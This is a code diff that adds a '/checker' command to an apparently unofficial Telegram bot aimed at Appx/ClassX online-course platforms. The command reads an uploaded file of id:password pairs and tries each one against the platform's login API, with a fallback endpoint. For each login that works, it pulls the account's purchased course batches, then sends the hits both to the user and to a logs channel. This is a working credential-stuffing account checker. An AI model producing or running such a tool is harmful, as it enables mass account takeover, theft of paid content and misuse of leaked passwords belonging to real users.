@@ -281,6 +281,281 @@ async def appex_v4_txt(app, message):
             "━━━━━━━━━━━━━━━━━━━━━"
         )
         await app.send_message(message.chat.id, error_msg)
+
+
+
+
+
+
+@app.on_message(filters.command(["checker"]))
+async def checker_command(app, message):
+    api_prompt = (
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "🌐 <b>ᴇɴᴛᴇʀ ᴀᴘɪ ᴜʀʟ</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "📝 <b>ɪɴsᴛʀᴜᴄᴛɪᴏɴs:</b>\n"
+        "• ᴅᴏɴ'ᴛ ɪɴᴄʟᴜᴅᴇ ʜᴛᴛᴘs://\n"
+        "• ᴏɴʟʏ sᴇɴᴅ ᴅᴏᴍᴀɪɴ ɴᴀᴍᴇ\n\n"
+        "📌 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
+        "<code>tcsexamzoneapi.classx.co.in</code>\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━"
+    )
+    api_msg = await app.ask(message.chat.id, text=api_prompt)
+    api_txt = api_msg.text.strip()
+    
+    # Validate API URL
+    if not api_txt:
+        return await message.reply_text("❌ Invalid API URL!")
+    
+    api_base = api_txt.replace("http://", "https://") if api_txt.startswith(("http://", "https://")) else f"https://{api_txt}"
+    app_name = api_base.replace("http://", "").replace("https://", "").replace("api.classx.co.in", "").replace("api.akamai.net.in", "").replace("apinew.teachx.in", "").replace("api.cloudflare.net.in", "").replace("api.appx.co.in", "").replace("/", "").strip()
+    
+    # Ask for credentials file
+    file_prompt = (
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "📄 <b>sᴇɴᴅ ᴄʀᴇᴅᴇɴᴛɪᴀʟs ғɪʟᴇ</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "📝 <b>ғɪʟᴇ ғᴏʀᴍᴀᴛ:</b>\n"
+        "• ᴇᴀᴄʜ ʟɪɴᴇ ᴍᴜsᴛ ʙᴇ:\n"
+        "<code>id:password</code>\n\n"
+        "📌 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
+        "<code>9769696969:password123</code>\n"
+        "<code>9876543210:pass456</code>\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━"
+    )
+    file_msg = await app.ask(message.chat.id, text=file_prompt)
+    
+    # Download and read the file
+    if not file_msg.document:
+        return await message.reply_text("❌ Please send a .txt file!")
+    
+    file_path = await app.download_media(file_msg.document)
+    
+    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+        credentials = f.read().strip().split('\n')
+    
+    os.remove(file_path)
+    
+    if not credentials or credentials == ['']:
+        return await message.reply_text("❌ File is empty or invalid format!")
+    
+    # Process each credential
+    total = len(credentials)
+    success_count = 0
+    failed_count = 0
+    results = []
+    
+    processing_msg = await message.reply_text(f"🔄 Processing {total} credentials...")
+    
+    for idx, cred in enumerate(credentials, 1):
+        try:
+            if ':' not in cred:
+                failed_count += 1
+                results.append(f"❌ Line {idx}: Invalid format - {cred}")
+                continue
+            
+            email, password = cred.split(':', 1)
+            email = email.strip()
+            password = password.strip()
+            
+            if not email or not password:
+                failed_count += 1
+                results.append(f"❌ Line {idx}: Empty credentials - {cred}")
+                continue
+            
+            # Try login
+            login_url = f"{api_base}/post/userLogin"
+            headers = {
+                "Auth-Key": "appxapi",
+                "User-Id": "-2",
+                "Authorization": "",
+                "User_app_category": "",
+                "Language": "en",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Accept-Encoding": "gzip, deflate",
+                "User-Agent": "okhttp/4.9.1"
+            }
+            data = {"email": email, "password": password}
+            
+            response = requests.post(login_url, data=data, headers=headers, timeout=10)
+            response_json = response.json()
+            status = response_json.get("status")
+            
+            if status == 200:
+                userid = response_json["data"]["userid"]
+                token = response_json["data"]["token"]
+                success_count += 1
+                
+                # Get batch list
+                hdr1 = {
+                    "Client-Service": "Appx",
+                    "source": "website",
+                    "Auth-Key": "appxapi",
+                    "Authorization": token,
+                    "User-ID": userid
+                }
+                
+                scraper = cloudscraper.create_scraper()
+                mc1 = scraper.get(f"{api_base}/get/mycoursev2?userid={userid}", headers=hdr1, timeout=10).json()
+                
+                batches = []
+                if "data" in mc1 and mc1["data"]:
+                    for ct in mc1["data"]:
+                        ci = ct.get("id")
+                        cn = ct.get("course_name")
+                        batches.append(f"  • {ci} - {cn}")
+                
+                batch_text = "\n".join(batches) if batches else "  No batches found"
+                
+                results.append(f"✅ Line {idx}: {email}\n   Batches:\n{batch_text}\n")
+                
+            elif status == 203:
+                # Try alternative login method
+                second_api_url = f"{api_base}/post/userLogin?extra_details=0"
+                second_headers = {
+                    "auth-key": "appxapi",
+                    "client-service": "Appx",
+                    "source": "website",
+                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+                    "accept": "*/*",
+                    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
+                }
+                second_data = {
+                    "source": "website",
+                    "phone": email,
+                    "email": email,
+                    "password": password,
+                    "extra_details": "1"
+                }
+                
+                second_response = requests.post(second_api_url, headers=second_headers, data=second_data, timeout=10).json()
+                
+                if second_response.get("status") == 200:
+                    userid = second_response["data"]["userid"]
+                    token = second_response["data"]["token"]
+                    success_count += 1
+                    
+                    # Get batch list
+                    hdr1 = {
+                        "Client-Service": "Appx",
+                        "source": "website",
+                        "Auth-Key": "appxapi",
+                        "Authorization": token,
+                        "User-ID": userid
+                    }
+                    
+                    scraper = cloudscraper.create_scraper()
+                    mc1 = scraper.get(f"{api_base}/get/mycoursev2?userid={userid}", headers=hdr1, timeout=10).json()
+                    
+                    batches = []
+                    if "data" in mc1 and mc1["data"]:
+                        for ct in mc1["data"]:
+                            ci = ct.get("id")
+                            cn = ct.get("course_name")
+                            batches.append(f"  • {ci} - {cn}")
+                    
+                    batch_text = "\n".join(batches) if batches else "  No batches found"
+                    
+                    results.append(f"✅ Line {idx}: {email}\n   Batches:\n{batch_text}\n")
+                else:
+                    failed_count += 1
+                    results.append(f"❌ Line {idx}: {email} - Login failed (203 error)\n")
+            else:
+                failed_count += 1
+                error_msg = response_json.get("message", "Login failed")
+                results.append(f"❌ Line {idx}: {email} - {error_msg}\n")
+                
+        except requests.exceptions.Timeout:
+            failed_count += 1
+            results.append(f"❌ Line {idx}: {cred} - Timeout error\n")
+        except requests.exceptions.RequestException as e:
+            failed_count += 1
+            results.append(f"❌ Line {idx}: {cred} - Connection error\n")
+        except json.JSONDecodeError:
+            failed_count += 1
+            results.append(f"❌ Line {idx}: {cred} - Invalid response\n")
+        except Exception as e:
+            failed_count += 1
+            results.append(f"❌ Line {idx}: {cred} - Error: {str(e)}\n")
+        
+        # Update progress
+        if idx % 5 == 0 or idx == total:
+            await processing_msg.edit_text(
+                f"🔄 Processing {idx}/{total} credentials...\n"
+                f"✅ Success: {success_count}\n"
+                f"❌ Failed: {failed_count}"
+            )
+    
+    # Generate output file
+    output_file = f"checker_results_{app_name}_{datetime.now(india_timezone).strftime('%d%m%Y_%H%M%S')}.txt"
+    
+    summary = (
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📊 CHECKER RESULTS\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🌐 API: {api_base}\n"
+        f"📅 Date: {time_new}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"📈 STATISTICS:\n"
+        f"   Total: {total}\n"
+        f"   ✅ Success: {success_count}\n"
+        f"   ❌ Failed: {failed_count}\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📋 DETAILED RESULTS:\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+    )
+    
+    with open(output_file, 'w', encoding='utf-8') as f:
+        f.write(summary)
+        f.write('\n'.join(results))
+    
+    # Send result
+    caption = (
+        f"✅ <b>Checker Complete!</b>\n\n"
+        f"🌐 <b>API:</b> {api_base}\n"
+        f"📊 <b>Total:</b> {total}\n"
+        f"✅ <b>Success:</b> {success_count}\n"
+        f"❌ <b>Failed:</b> {failed_count}\n\n"
+        f"📁 <b>Results exported to file</b>\n"
+        f"📅 <b>Date:</b> {time_new}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🔰 Maintained by @imxTaR"
+    )
+    
+    await app.send_document(
+        message.chat.id,
+        document=output_file,
+        caption=caption
+    )
+    
+    # Also send to logs
+    await app.send_document(PREMIUM_LOGS, document=output_file, caption=caption)
+    
+    # Cleanup
+    if os.path.exists(output_file):
+        os.remove(output_file)
+    
+    await processing_msg.delete()
+    
+    success_msg = (
+        f"✅ <b>Checker completed successfully!</b>\n\n"
+        f"📊 <b>Results:</b>\n"
+        f"   Total: {total}\n"
+        f"   ✅ Success: {success_count}\n"
+        f"   ❌ Failed: {failed_count}\n\n"
+        f"📁 File has been sent above!"
+    )
+    
+    await message.reply_text(success_msg)
+
+
+
+
+
+
+
+
+
         
 async def appex_v5_txt(app, message, api, name):
    
